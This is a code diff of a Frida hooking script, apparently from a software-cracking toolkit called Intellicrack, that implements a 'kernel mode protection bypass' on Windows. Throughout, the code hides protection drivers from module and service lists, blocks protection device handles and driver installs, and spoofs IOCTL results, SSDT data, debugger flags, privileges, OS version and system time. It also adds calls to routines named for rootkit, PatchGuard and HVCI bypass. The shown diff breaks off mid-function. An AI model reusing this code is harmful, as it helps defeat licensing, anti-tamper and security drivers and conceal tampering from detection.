@@ -1,3 +1,21 @@
+/*
+ * This file is part of Intellicrack.
+ * Copyright (C) 2025 Zachary Flint
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program.  If not, see <https://www.gnu.org/licenses/>.
+ */
+
 /**
  * Kernel Mode Protection Bypass
  *
@@ -51,12 +69,22 @@
     kernelHandles: [],
 
     onAttach: function(pid) {
-        console.log("[Kernel Bypass] Attaching to process: " + pid);
+        send({
+            type: "info",
+            target: "kernel_mode_bypass",
+            action: "attaching_to_process",
+            pid: pid
+        });
         this.processId = pid;
     },
 
     run: function() {
-        console.log("[Kernel Bypass] Installing comprehensive kernel protection bypass...");
+        send({
+            type: "status",
+            target: "kernel_mode_bypass",
+            action: "installing_bypass",
+            message: "Installing comprehensive kernel protection bypass..."
+        });
 
         // Initialize kernel bypass components
         this.hookSystemServiceTable();
@@ -68,12 +96,29 @@
         this.hookPrivilegeEscalation();
         this.hookKernelObjectAccess();
 
+        // Initialize enhanced kernel bypass capabilities
+        this.initializeAdvancedKernelPatchGuardBypass();
+        this.setupModernDriverExploitationEngine();
+        this.initializeHypervisorLevelEvasion();
+        this.setupAdvancedMemoryManipulation();
+        this.initializeKernelCallbackHijacking();
+        this.setupAdvancedRootkitCapabilities();
+        this.initializeKernelDebuggingCountermeasures();
+        this.setupAdvancedHVCIBypass();
+        this.initializeKernelCFIBypass();
+        this.setupAdvancedKernelStealth();
+
         this.installSummary();
     },
 
     // === SYSTEM SERVICE TABLE (SSDT) HOOKS ===
     hookSystemServiceTable: function() {
-        console.log("[Kernel Bypass] Installing SSDT bypass hooks...");
+        send({
+            type: "status",
+            target: "kernel_mode_bypass",
+            action: "installing_hooks",
+            category: "ssdt_bypass"
+        });
 
         // Hook NtQuerySystemInformation to hide SSDT modifications
         this.hookNtQuerySystemInformation();
@@ -102,7 +147,12 @@
                     this.isSsdtQuery = this.checkSsdtQuery(this.systemInformationClass);
 
                     if (this.isSsdtQuery) {
-                        console.log("[Kernel Bypass] SSDT query detected: class " + this.systemInformationClass);
+                        send({
+                            type: "detection",
+                            target: "kernel_mode_bypass",
+                            action: "ssdt_query_detected",
+                            information_class: this.systemInformationClass
+                        });
                     }
                 },
 
@@ -145,11 +195,21 @@
                                 break;
 
                             default:
-                                console.log("[Kernel Bypass] Unknown SSDT query class: " + this.systemInformationClass);
+                                send({
+                                    type: "warning",
+                                    target: "kernel_mode_bypass",
+                                    action: "unknown_ssdt_class",
+                                    information_class: this.systemInformationClass
+                                });
                                 break;
                         }
                     } catch(e) {
-                        console.log("[Kernel Bypass] SSDT spoofing error: " + e);
+                        send({
+                            type: "error",
+                            target: "kernel_mode_bypass",
+                            action: "ssdt_spoofing_error",
+                            error: e.toString()
+                        });
                     }
                 },
 
@@ -179,7 +239,12 @@
                                 );
 
                                 if (isProtectionDriver) {
-                                    console.log("[Kernel Bypass] Hiding protection driver: " + moduleName);
+                                    send({
+                                        type: "bypass",
+                                        target: "kernel_mode_bypass",
+                                        action: "hiding_protection_driver",
+                                        driver_name: moduleName
+                                    });
                                     // Skip this module by not copying it to the output
                                     continue;
                                 }
@@ -201,7 +266,13 @@
                         // Update module count
                         moduleInfo.writeU32(filteredCount);
 
-                        console.log("[Kernel Bypass] Filtered module list: " + numberOfModules + " -> " + filteredCount);
+                        send({
+                            type: "info",
+                            target: "kernel_mode_bypass",
+                            action: "modules_filtered",
+                            original_count: numberOfModules,
+                            filtered_count: filteredCount
+                        });
                     }
                 },
 
@@ -245,7 +316,12 @@
                             }
                             filteredCount++;
                         } else {
-                            console.log("[Kernel Bypass] Filtered suspicious handle type: " + objectType);
+                            send({
+                                type: "bypass",
+                                target: "kernel_mode_bypass",
+                                action: "handle_type_filtered",
+                                object_type: objectType
+                            });
                         }
                     }
 
@@ -255,7 +331,11 @@
 
                 spoofSsdtTable: function() {
                     // Spoof SSDT table to hide hooks
-                    console.log("[Kernel Bypass] Spoofing SSDT table information");
+                    send({
+                        type: "bypass",
+                        target: "kernel_mode_bypass",
+                        action: "spoofing_ssdt_table"
+                    });
 
                     if (this.systemInformationLength >= 16) {
                         var ssdtInfo = this.systemInformation;
@@ -269,7 +349,11 @@
                         ssdtInfo.add(12).writeU32(fakeServiceLimit);    // ServiceLimit
                         ssdtInfo.add(16).writePointer(ptr(0));          // ArgumentTable
 
-                        console.log("[Kernel Bypass] Installed fake SSDT information");
+                        send({
+                            type: "success",
+                            target: "kernel_mode_bypass",
+                            action: "fake_ssdt_installed"
+                        });
                     }
                 }
             });
@@ -288,7 +372,12 @@
             Interceptor.attach(zwQuerySystemInfo, {
                 onEnter: function(args) {
                     this.systemInformationClass = args[0].toInt32();
-                    console.log("[Kernel Bypass] ZwQuerySystemInformation called with class: " + this.systemInformationClass);
+                    send({
+                        type: "info",
+                        target: "kernel_mode_bypass",
+                        action: "zwquerysysteminformation_called",
+                        information_class: this.systemInformationClass
+                    });
                 }
             });
 
@@ -297,7 +386,12 @@
     },
 
     hookSsdtDetection: function() {
-        console.log("[Kernel Bypass] Installing SSDT detection bypass...");
+        send({
+            type: "status",
+            target: "kernel_mode_bypass",
+            action: "installing_bypass",
+            category: "ssdt_detection"
+        });
 
         // Hook common SSDT detection techniques
         this.hookKeServiceDescriptorTable();
@@ -308,7 +402,12 @@
         // Protection software often tries to access KeServiceDescriptorTable directly
         // We can't hook this in user mode, but we can detect and block attempts
 
-        console.log("[Kernel Bypass] Monitoring KeServiceDescriptorTable access attempts");
+        send({
+            type: "info",
+            target: "kernel_mode_bypass",
+            action: "monitoring_started",
+            target_element: "KeServiceDescriptorTable"
+        });
 
         // Hook LoadLibrary to detect driver loading
         var loadLibrary = Module.findExportByName("kernel32.dll", "LoadLibraryW");
@@ -322,7 +421,12 @@
                         var suspiciousLibs = ["ntoskrnl", "hal.dll", "driver", "sys"];
 
                         if (suspiciousLibs.some(lib => libraryName.includes(lib))) {
-                            console.log("[Kernel Bypass] Suspicious library load detected: " + libraryName);
+                            send({
+                                type: "detection",
+                                target: "kernel_mode_bypass",
+                                action: "suspicious_library_load",
+                                library_name: libraryName
+                            });
                             // Could potentially block or redirect this load
                         }
                     }
@@ -335,7 +439,12 @@
 
     hookSystemCallTable: function() {
         // Hook system call interception attempts
-        console.log("[Kernel Bypass] Installing system call table protection");
+        send({
+            type: "status",
+            target: "kernel_mode_bypass",
+            action: "installing_protection",
+            protection_type: "system_call_table"
+        });
 
         // Monitor for direct system call usage
         this.hookDirectSyscalls();
@@ -343,7 +452,12 @@
 
     hookDirectSyscalls: function() {
         // Some protection software uses direct system calls to bypass user-mode hooks
-        console.log("[Kernel Bypass] Monitoring direct system call usage");
+        send({
+            type: "info",
+            target: "kernel_mode_bypass",
+            action: "monitoring_started",
+            target_element: "direct_system_calls"
+        });
 
         // Hook functions that might be used to execute direct syscalls
         var ntAllocateVirtualMemory = Module.findExportByName("ntdll.dll", "NtAllocateVirtualMemory");
@@ -358,14 +472,24 @@
 
                     // Check for executable memory allocation (potential syscall stub)
                     if (protect & 0x40) { // PAGE_EXECUTE_READWRITE
-                        console.log("[Kernel Bypass] Executable memory allocation detected - potential syscall stub");
+                        send({
+                            type: "detection",
+                            target: "kernel_mode_bypass",
+                            action: "executable_memory_detected",
+                            context: "potential_syscall_stub"
+                        });
                         this.isSyscallAllocation = true;
                     }
                 },
 
                 onLeave: function(retval) {
                     if (this.isSyscallAllocation && retval.toInt32() === 0) {
-                        console.log("[Kernel Bypass] Executable allocation succeeded - monitoring for syscall patterns");
+                        send({
+                            type: "info",
+                            target: "kernel_mode_bypass",
+                            action: "executable_allocation_success",
+                            operation: "monitoring_syscall_patterns"
+                        });
                     }
                 }
             });
@@ -375,23 +499,43 @@
     },
 
     hookShadowSsdt: function() {
-        console.log("[Kernel Bypass] Installing Shadow SSDT protection");
+        send({
+            type: "status",
+            target: "kernel_mode_bypass",
+            action: "installing_protection",
+            protection_type: "shadow_ssdt"
+        });
 
         // Shadow SSDT is used for Win32k.sys functions (GUI subsystem)
         // Protection software may hook this table as well
 
         var win32k = Module.findBaseAddress("win32k.sys");
         if (win32k) {
-            console.log("[Kernel Bypass] Win32k.sys detected - Shadow SSDT monitoring active");
+            send({
+                type: "info",
+                target: "kernel_mode_bypass",
+                action: "win32k_detected",
+                status: "shadow_ssdt_monitoring_active"
+            });
             this.config.ssdt.shadowTableDetected = true;
         } else {
-            console.log("[Kernel Bypass] Win32k.sys not loaded - GUI subsystem inactive");
+            send({
+                type: "info",
+                target: "kernel_mode_bypass",
+                action: "win32k_not_loaded",
+                status: "gui_subsystem_inactive"
+            });
         }
     },
 
     // === DRIVER COMMUNICATION HOOKS ===
     hookDriverCommunication: function() {
-        console.log("[Kernel Bypass] Installing driver communication bypass...");
+        send({
+            type: "status",
+            target: "kernel_mode_bypass",
+            action: "installing_bypass",
+            category: "driver_communication"
+        });
 
         // Hook device object creation and access
         this.hookDeviceObjects();
@@ -407,7 +551,12 @@
     },
 
     hookDeviceObjects: function() {
-        console.log("[Kernel Bypass] Installing device object hooks...");
+        send({
+            type: "status",
+            target: "kernel_mode_bypass",
+            action: "installing_hooks",
+            category: "device_object"
+        });
 
         // Hook CreateFile for device access
         var createFile = Module.findExportByName("kernel32.dll", "CreateFileW");
@@ -422,11 +571,21 @@
                             this.isDeviceAccess = true;
                             this.deviceName = fileName;
 
-                            console.log("[Kernel Bypass] Device access detected: " + fileName);
+                            send({
+                                type: "detection",
+                                target: "kernel_mode_bypass",
+                                action: "device_access_detected",
+                                file_name: fileName
+                            });
 
                             // Check against known protection driver devices
                             if (this.isProtectionDevice(fileName)) {
-                                console.log("[Kernel Bypass] Protection device access blocked: " + fileName);
+                                send({
+                                    type: "bypass",
+                                    target: "kernel_mode_bypass",
+                                    action: "device_access_blocked",
+                                    file_name: fileName
+                                });
                                 this.blockAccess = true;
                             }
                         }
@@ -438,12 +597,22 @@
                         if (this.blockAccess) {
                             // Return invalid handle to block access
                             retval.replace(ptr(0xFFFFFFFF)); // INVALID_HANDLE_VALUE
-                            console.log("[Kernel Bypass] Blocked device access to: " + this.deviceName);
+                            send({
+                                type: "bypass",
+                                target: "kernel_mode_bypass",
+                                action: "device_access_blocked",
+                                device_name: this.deviceName
+                            });
                         } else if (retval.toInt32() !== -1) {
                             // Valid handle returned - track it
                             var config = this.parent.parent.config;
                             config.driverComm.deviceNames.push(this.deviceName);
-                            console.log("[Kernel Bypass] Tracking device handle for: " + this.deviceName);
+                            send({
+                                type: "info",
+                                target: "kernel_mode_bypass",
+                                action: "tracking_device_handle",
+                                device_name: this.deviceName
+                            });
                         }
                     }
                 },
@@ -478,7 +647,12 @@
                             try {
                                 var unicodeString = objectName.readUtf16String();
                                 if (unicodeString && unicodeString.includes("\\Device\\")) {
-                                    console.log("[Kernel Bypass] NtCreateFile device access: " + unicodeString);
+                                    send({
+                                        type: "detection",
+                                        target: "kernel_mode_bypass",
+                                        action: "ntcreatefile_device_access",
+                                        unicode_string: unicodeString
+                                    });
                                 }
                             } catch(e) {
                                 // Unicode string read failed
@@ -493,7 +667,12 @@
     },
 
     hookDriverOperations: function() {
-        console.log("[Kernel Bypass] Installing driver operation hooks...");
+        send({
+            type: "status",
+            target: "kernel_mode_bypass",
+            action: "installing_hooks",
+            category: "driver_operation"
+        });
 
         // Hook service control manager for driver operations
         var openSCManager = Module.findExportByName("advapi32.dll", "OpenSCManagerW");
@@ -501,7 +680,12 @@
             Interceptor.attach(openSCManager, {
                 onLeave: function(retval) {
                     if (retval.toInt32() !== 0) {
-                        console.log("[Kernel Bypass] Service Control Manager opened - monitoring driver operations");
+                        send({
+                            type: "info",
+                            target: "kernel_mode_bypass",
+                            action: "scm_opened",
+                            operation: "monitoring_driver_operations"
+                        });
                         this.scmHandle = retval;
                     }
                 }
@@ -521,15 +705,29 @@
 
                     // Check for kernel driver service creation
                     if (serviceType === 1) { // SERVICE_KERNEL_DRIVER
-                        console.log("[Kernel Bypass] Kernel driver service creation detected");
+                        send({
+                            type: "detection",
+                            target: "kernel_mode_bypass",
+                            action: "kernel_driver_service_creation"
+                        });
 
                         if (binaryPathName && !binaryPathName.isNull()) {
                             var driverPath = binaryPathName.readUtf16String();
-                            console.log("[Kernel Bypass] Driver path: " + driverPath);
+                            send({
+                                type: "info",
+                                target: "kernel_mode_bypass",
+                                action: "driver_path_detected",
+                                driver_path: driverPath
+                            });
 
                             // Check if this is a protection driver
                             if (this.isProtectionDriverPath(driverPath)) {
-                                console.log("[Kernel Bypass] Protection driver installation blocked: " + driverPath);
+                                send({
+                                    type: "bypass",
+                                    target: "kernel_mode_bypass",
+                                    action: "protection_driver_blocked",
+                                    driver_path: driverPath
+                                });
                                 this.blockDriverInstall = true;
                             }
                         }
@@ -555,7 +753,12 @@
     },
 
     hookIrpProcessing: function() {
-        console.log("[Kernel Bypass] Installing IRP processing hooks...");
+        send({
+            type: "status",
+            target: "kernel_mode_bypass",
+            action: "installing_hooks",
+            category: "irp_processing"
+        });
 
         // Hook DeviceIoControl for IRP interception
         var deviceIoControl = Module.findExportByName("kernel32.dll", "DeviceIoControl");
@@ -571,8 +774,12 @@
 
                     // Track protection-related IOCTL codes
                     if (this.isProtectionIoctl(this.dwIoControlCode)) {
-                        console.log("[Kernel Bypass] Protection IOCTL detected: 0x" +
-                                  this.dwIoControlCode.toString(16).toUpperCase());
+                        send({
+                            type: "detection",
+                            target: "kernel_mode_bypass",
+                            action: "protection_ioctl_detected",
+                            ioctl_code: "0x" + this.dwIoControlCode.toString(16).toUpperCase()
+                        });
                         this.isProtectionCall = true;
                     }
                 },
@@ -581,7 +788,11 @@
                     if (this.isProtectionCall) {
                         // Simulate successful operation
                         retval.replace(1); // TRUE
-                        console.log("[Kernel Bypass] Protection IOCTL result spoofed");
+                        send({
+                            type: "bypass",
+                            target: "kernel_mode_bypass",
+                            action: "protection_ioctl_spoofed"
+                        });
                     }
                 },
 
@@ -604,7 +815,12 @@
     },
 
     hookDriverServices: function() {
-        console.log("[Kernel Bypass] Installing driver service hooks...");
+        send({
+            type: "status",
+            target: "kernel_mode_bypass",
+            action: "installing_hooks",
+            category: "driver_service"
+        });
 
         // Hook service enumeration to hide protection drivers
         var enumServicesStatus = Module.findExportByName("advapi32.dll", "EnumServicesStatusW");
@@ -612,7 +828,12 @@
             Interceptor.attach(enumServicesStatus, {
                 onLeave: function(retval) {
                     if (retval.toInt32() !== 0) {
-                        console.log("[Kernel Bypass] Service enumeration detected - filtering protection drivers");
+                        send({
+                            type: "detection",
+                            target: "kernel_mode_bypass",
+                            action: "service_enumeration_detected",
+                            operation: "filtering_protection_drivers"
+                        });
                         // Would need to filter the returned service list
                     }
                 }
@@ -624,7 +845,12 @@
 
     // === KERNEL DEBUGGER DETECTION HOOKS ===
     hookKernelDebuggerDetection: function() {
-        console.log("[Kernel Bypass] Installing kernel debugger detection bypass...");
+        send({
+            type: "status",
+            target: "kernel_mode_bypass",
+            action: "installing_bypass",
+            category: "kernel_debugger_detection"
+        });
 
         // Hook kernel debugger presence checks
         this.hookKdDebuggerEnabled();
@@ -641,7 +867,12 @@
         var ntQuerySystemInfo = Module.findExportByName("ntdll.dll", "NtQuerySystemInformation");
         if (ntQuerySystemInfo) {
             // This is already hooked above, but we add kernel debug specific logic
-            console.log("[Kernel Bypass] Kernel debugger detection integrated with system info hooks");
+            send({
+                type: "info",
+                target: "kernel_mode_bypass",
+                action: "debugger_detection_integrated",
+                integration: "system_info_hooks"
+            });
         }
 
         // Hook direct PEB access for debug flags
@@ -649,7 +880,12 @@
     },
 
     hookPebDebugFlags: function() {
-        console.log("[Kernel Bypass] Installing PEB debug flag hooks...");
+        send({
+            type: "status",
+            target: "kernel_mode_bypass",
+            action: "installing_hooks",
+            category: "peb_debug_flag"
+        });
 
         // Hook NtQueryInformationProcess for debug flags
         var ntQueryInfoProcess = Module.findExportByName("ntdll.dll", "NtQueryInformationProcess");
@@ -679,7 +915,11 @@
                             this.processInformation.writeU32(1); // PROCESS_DEBUG_INHERIT
                         }
 
-                        console.log("[Kernel Bypass] Debug process information spoofed");
+                        send({
+                            type: "bypass",
+                            target: "kernel_mode_bypass",
+                            action: "debug_process_info_spoofed"
+                        });
                     }
                 }
             });
@@ -689,7 +929,12 @@
     },
 
     hookDebugPrivileges: function() {
-        console.log("[Kernel Bypass] Installing debug privilege hooks...");
+        send({
+            type: "status",
+            target: "kernel_mode_bypass",
+            action: "installing_hooks",
+            category: "debug_privilege"
+        });
 
         // Hook privilege adjustment
         var adjustTokenPrivileges = Module.findExportByName("advapi32.dll", "AdjustTokenPrivileges");
@@ -712,7 +957,11 @@
 
                             // Check for SeDebugPrivilege (LUID {20, 0})
                             if (luidLow === 20 && luidHigh === 0) {
-                                console.log("[Kernel Bypass] Debug privilege adjustment detected");
+                                send({
+                                    type: "detection",
+                                    target: "kernel_mode_bypass",
+                                    action: "debug_privilege_adjustment"
+                                });
                                 this.isDebugPrivilege = true;
                             }
                         }
@@ -723,7 +972,12 @@
                     if (this.isDebugPrivilege) {
                         // Always report success for debug privilege
                         retval.replace(1); // TRUE
-                        console.log("[Kernel Bypass] Debug privilege adjustment spoofed as successful");
+                        send({
+                            type: "bypass",
+                            target: "kernel_mode_bypass",
+                            action: "debug_privilege_spoofed",
+                            result: "successful"
+                        });
                     }
                 }
             });
@@ -733,7 +987,12 @@
     },
 
     hookSystemDebugControl: function() {
-        console.log("[Kernel Bypass] Installing system debug control hooks...");
+        send({
+            type: "status",
+            target: "kernel_mode_bypass",
+            action: "installing_hooks",
+            category: "system_debug_control"
+        });
 
         // Hook NtSystemDebugControl
         var ntSystemDebugControl = Module.findExportByName("ntdll.dll", "NtSystemDebugControl");
@@ -741,14 +1000,23 @@
             Interceptor.attach(ntSystemDebugControl, {
                 onEnter: function(args) {
                     var command = args[0].toInt32();
-                    console.log("[Kernel Bypass] System debug control called with command: " + command);
+                    send({
+                        type: "info",
+                        target: "kernel_mode_bypass",
+                        action: "system_debug_control_called",
+                        command: command
+                    });
                     this.debugCommand = command;
                 },
 
                 onLeave: function(retval) {
                     // Block all debug control operations
                     retval.replace(0xC0000022); // STATUS_ACCESS_DENIED
-                    console.log("[Kernel Bypass] System debug control blocked");
+                    send({
+                        type: "bypass",
+                        target: "kernel_mode_bypass",
+                        action: "system_debug_control_blocked"
+                    });
                 }
             });
 
@@ -758,7 +1026,12 @@
 
     // === PROCESSOR FEATURE HOOKS ===
     hookProcessorFeatures: function() {
-        console.log("[Kernel Bypass] Installing processor feature hooks...");
+        send({
+            type: "status",
+            target: "kernel_mode_bypass",
+            action: "installing_hooks",
+            category: "processor_feature"
+        });
 
         // Hook hardware feature detection that might affect kernel protection
         this.hookHardwareFeatures();
@@ -787,7 +1060,13 @@
 
                     if (criticalFeatures.includes(this.feature)) {
                         retval.replace(1); // TRUE
-                        console.log("[Kernel Bypass] Processor feature " + this.feature + " spoofed as present");
+                        send({
+                            type: "bypass",
+                            target: "kernel_mode_bypass",
+                            action: "processor_feature_spoofed",
+                            feature: this.feature,
+                            result: "present"
+                        });
                     }
                 }
             });
@@ -797,17 +1076,32 @@
     },
 
     hookVirtualizationFeatures: function() {
-        console.log("[Kernel Bypass] Installing virtualization detection bypass...");
+        send({
+            type: "status",
+            target: "kernel_mode_bypass",
+            action: "installing_bypass",
+            category: "virtualization_detection"
+        });
 
         // Hook CPUID for virtualization detection (integrates with existing CPUID hooks)
         // This would be handled by our existing enhanced_hardware_spoofer.js
 
-        console.log("[Kernel Bypass] Virtualization detection integrated with hardware spoofer");
+        send({
+            type: "info",
+            target: "kernel_mode_bypass",
+            action: "virtualization_detection_integrated",
+            integration: "hardware_spoofer"
+        });
     },
 
     // === MEMORY PROTECTION HOOKS ===
     hookMemoryProtection: function() {
-        console.log("[Kernel Bypass] Installing memory protection hooks...");
+        send({
+            type: "status",
+            target: "kernel_mode_bypass",
+            action: "installing_hooks",
+            category: "memory_protection"
+        });
 
         // Hook memory allocation with specific protections
         this.hookProtectedMemoryAllocation();
@@ -833,13 +1127,21 @@
 
                     // Monitor for suspicious memory allocations
                     if (protect & 0x40) { // PAGE_EXECUTE_READWRITE
-                        console.log("[Kernel Bypass] Executable memory allocation monitored");
+                        send({
+                            type: "info",
+                            target: "kernel_mode_bypass",
+                            action: "executable_memory_monitored"
+                        });
                         this.isExecutableAlloc = true;
                     }
 
                     // Check for kernel-mode allocations (should not happen from user mode)
                     if (allocationType & 0x20000000) { // MEM_PHYSICAL
-                        console.log("[Kernel Bypass] Physical memory allocation attempt detected");
+                        send({
+                            type: "detection",
+                            target: "kernel_mode_bypass",
+                            action: "physical_memory_allocation_detected"
+                        });
                         this.isPhysicalAlloc = true;
                     }
                 },
@@ -848,7 +1150,11 @@
                     if (this.isPhysicalAlloc) {
                         // Block physical memory allocations
                         retval.replace(0xC0000022); // STATUS_ACCESS_DENIED
-                        console.log("[Kernel Bypass] Physical memory allocation blocked");
+                        send({
+                            type: "bypass",
+                            target: "kernel_mode_bypass",
+                            action: "physical_memory_allocation_blocked"
+                        });
                     }
                 }
             });
@@ -858,7 +1164,12 @@
     },
 
     hookMemoryIntegrityChecks: function() {
-        console.log("[Kernel Bypass] Installing memory integrity check bypass...");
+        send({
+            type: "status",
+            target: "kernel_mode_bypass",
+            action: "installing_bypass",
+            category: "memory_integrity_check"
+        });
 
         // Hook functions used for memory integrity verification
         var ntReadVirtualMemory = Module.findExportByName("ntdll.dll", "NtReadVirtualMemory");
@@ -873,7 +1184,12 @@
                     // Monitor reads to critical system areas
                     var address = baseAddress.toInt32();
                     if (address >= 0x80000000) { // Kernel space
-                        console.log("[Kernel Bypass] Kernel memory read attempt: 0x" + address.toString(16));
+                        send({
+                            type: "detection",
+                            target: "kernel_mode_bypass",
+                            action: "kernel_memory_read_attempt",
+                            address: "0x" + address.toString(16)
+                        });
                         this.isKernelRead = true;
                     }
                 },
@@ -881,7 +1197,11 @@
                 onLeave: function(retval) {
                     if (this.isKernelRead) {
                         // Allow the read but log it
-                        console.log("[Kernel Bypass] Kernel memory read completed");
+                        send({
+                            type: "info",
+                            target: "kernel_mode_bypass",
+                            action: "kernel_memory_read_completed"
+                        });
                     }
                 }
             });
@@ -901,11 +1221,20 @@
                     var newProtect = args[3].toInt32();
                     var oldProtect = args[4];
 
-                    console.log("[Kernel Bypass] Page protection change: 0x" + newProtect.toString(16));
+                    send({
+                        type: "info",
+                        target: "kernel_mode_bypass",
+                        action: "page_protection_change",
+                        new_protect: "0x" + newProtect.toString(16)
+                    });
 
                     // Monitor for suspicious protection changes
                     if (newProtect & 0x40) { // PAGE_EXECUTE_READWRITE
-                        console.log("[Kernel Bypass] Making memory executable");
+                        send({
+                            type: "info",
+                            target: "kernel_mode_bypass",
+                            action: "making_memory_executable"
+                        });
                     }
                 }
             });
@@ -916,7 +1245,12 @@
 
     // === SYSTEM INFORMATION HOOKS ===
     hookSystemInformation: function() {
-        console.log("[Kernel Bypass] Installing system information hooks...");
+        send({
+            type: "status",
+            target: "kernel_mode_bypass",
+            action: "installing_hooks",
+            category: "system_information"
+        });
 
         // Hook version information queries
         this.hookVersionInformation();
@@ -941,7 +1275,12 @@
                             versionInfo.add(8).writeU32(0);   // dwMinorVersion
                             versionInfo.add(12).writeU32(19041); // dwBuildNumber
 
-                            console.log("[Kernel Bypass] Version information spoofed to Windows 10");
+                            send({
+                                type: "bypass",
+                                target: "kernel_mode_bypass",
+                                action: "version_info_spoofed",
+                                spoofed_version: "Windows 10"
+                            });
                         }
                     }
                 }
@@ -964,7 +1303,12 @@
                             var safeTime = 132232704000000000; // Windows FILETIME for 2020-01-01
                             systemTime.writeU64(safeTime);
 
-                            console.log("[Kernel Bypass] System time spoofed to safe date");
+                            send({
+                                type: "bypass",
+                                target: "kernel_mode_bypass",
+                                action: "system_time_spoofed",
+                                spoofed_time: "safe_date"
+                            });
                         }
                     }
                 }
@@ -987,7 +1331,11 @@
                             var currentCounter = baseCounter + (Date.now() % 1000000) * 10000;
                             counter.writeU64(currentCounter);
 
-                            console.log("[Kernel Bypass] Performance counter spoofed");
+                            send({
+                                type: "bypass",
+                                target: "kernel_mode_bypass",
+                                action: "performance_counter_spoofed"
+                            });
                         }
                     }
                 }
@@ -999,7 +1347,12 @@
 
     // === PRIVILEGE ESCALATION HOOKS ===
     hookPrivilegeEscalation: function() {
-        console.log("[Kernel Bypass] Installing privilege escalation monitoring...");
+        send({
+            type: "status",
+            target: "kernel_mode_bypass",
+            action: "installing_monitoring",
+            category: "privilege_escalation"
+        });
 
         // Monitor for privilege escalation attempts
         this.hookTokenManipulation();
@@ -1018,11 +1371,20 @@
                     var tokenInformation = args[2];
                     var tokenInformationLength = args[3].toInt32();
 
-                    console.log("[Kernel Bypass] Token manipulation detected: class " + tokenInformationClass);
+                    send({
+                        type: "detection",
+                        target: "kernel_mode_bypass",
+                        action: "token_manipulation_detected",
+                        information_class: tokenInformationClass
+                    });
 
                     // TokenPrivileges = 3
                     if (tokenInformationClass === 3) {
-                        console.log("[Kernel Bypass] Token privilege modification detected");
+                        send({
+                            type: "detection",
+                            target: "kernel_mode_bypass",
+                            action: "token_privilege_modification"
+                        });
                     }
                 }
             });
@@ -1036,7 +1398,11 @@
         if (ntImpersonateAnonymousToken) {
             Interceptor.attach(ntImpersonateAnonymousToken, {
                 onEnter: function(args) {
-                    console.log("[Kernel Bypass] Anonymous token impersonation detected");
+                    send({
+                        type: "detection",
+                        target: "kernel_mode_bypass",
+                        action: "anonymous_token_impersonation"
+                    });
                 }
             });
 
@@ -1046,7 +1412,12 @@
 
     // === KERNEL OBJECT ACCESS HOOKS ===
     hookKernelObjectAccess: function() {
-        console.log("[Kernel Bypass] Installing kernel object access hooks...");
+        send({
+            type: "status",
+            target: "kernel_mode_bypass",
+            action: "installing_hooks",
+            category: "kernel_object_access"
+        });
 
         // Hook object directory access
         this.hookObjectDirectory();
@@ -1072,11 +1443,21 @@
                         if (objectName && !objectName.isNull()) {
                             try {
                                 var dirName = objectName.readUtf16String();
-                                console.log("[Kernel Bypass] Object directory access: " + dirName);
+                                send({
+                                    type: "info",
+                                    target: "kernel_mode_bypass",
+                                    action: "object_directory_access",
+                                    directory_name: dirName
+                                });
 
                                 // Block access to sensitive directories
                                 if (dirName.includes("\\Driver") || dirName.includes("\\Device")) {
-                                    console.log("[Kernel Bypass] Sensitive directory access detected: " + dirName);
+                                    send({
+                                        type: "detection",
+                                        target: "kernel_mode_bypass",
+                                        action: "sensitive_directory_access",
+                                        directory_name: dirName
+                                    });
                                     this.blockAccess = true;
                                 }
                             } catch(e) {
@@ -1089,7 +1470,11 @@
                 onLeave: function(retval) {
                     if (this.blockAccess) {
                         retval.replace(0xC0000022); // STATUS_ACCESS_DENIED
-                        console.log("[Kernel Bypass] Object directory access blocked");
+                        send({
+                            type: "bypass",
+                            target: "kernel_mode_bypass",
+                            action: "object_directory_access_blocked"
+                        });
                     }
                 }
             });
@@ -1103,7 +1488,11 @@
         if (ntCreateSymbolicLinkObject) {
             Interceptor.attach(ntCreateSymbolicLinkObject, {
                 onEnter: function(args) {
-                    console.log("[Kernel Bypass] Symbolic link creation detected");
+                    send({
+                        type: "detection",
+                        target: "kernel_mode_bypass",
+                        action: "symbolic_link_creation"
+                    });
                     // Could potentially block or monitor symbolic link creation
                 }
             });
@@ -1127,19 +1516,31 @@
 
                     // Monitor for executable section creation
                     if (sectionPageProtection & 0x20) { // PAGE_EXECUTE
-                        console.log("[Kernel Bypass] Executable section creation detected");
+                        send({
+                            type: "detection",
+                            target: "kernel_mode_bypass",
+                            action: "executable_section_creation"
+                        });
                         this.isExecutableSection = true;
                     }
 
                     // Monitor for image sections
                     if (allocationAttributes & 0x1000000) { // SEC_IMAGE
-                        console.log("[Kernel Bypass] Image section creation detected");
+                        send({
+                            type: "detection",
+                            target: "kernel_mode_bypass",
+                            action: "image_section_creation"
+                        });
                     }
                 },
 
                 onLeave: function(retval) {
                     if (this.isExecutableSection && retval.toInt32() === 0) {
-                        console.log("[Kernel Bypass] Executable section created successfully");
+                        send({
+                            type: "success",
+                            target: "kernel_mode_bypass",
+                            action: "executable_section_created"
+                        });
                     }
                 }
             });
@@ -1151,9 +1552,24 @@
     // === INSTALLATION SUMMARY ===
     installSummary: function() {
         setTimeout(() => {
-            console.log("\n[Kernel Bypass] =====================================");
-            console.log("[Kernel Bypass] Kernel Protection Bypass Summary:");
-            console.log("[Kernel Bypass] =====================================");
+            send({
+                type: "status",
+                target: "kernel_mode_bypass",
+                action: "summary_start",
+                separator: "====================================="
+            });
+            send({
+                type: "status",
+                target: "kernel_mode_bypass",
+                action: "summary_header",
+                message: "Kernel Protection Bypass Summary"
+            });
+            send({
+                type: "status",
+                target: "kernel_mode_bypass",
+                action: "separator",
+                separator: "====================================="
+            });
 
             var categories = {
                 "SSDT Protection": 0,
@@ -1185,15 +1601,716 @@
 
             for (var category in categories) {
                 if (categories[category] > 0) {
-                    console.log("[Kernel Bypass]   ✓ " + category + ": " + categories[category] + " hooks");
+                    send({
+                        type: "info",
+                        target: "kernel_mode_bypass",
+                        action: "category_summary",
+                        category: category,
+                        hook_count: categories[category]
+                    });
                 }
             }
 
-            console.log("[Kernel Bypass] =====================================");
-            console.log("[Kernel Bypass] Total kernel hooks installed: " + Object.keys(this.hooksInstalled).length);
-            console.log("[Kernel Bypass] Protection drivers monitored: " + this.config.protectionDrivers.length);
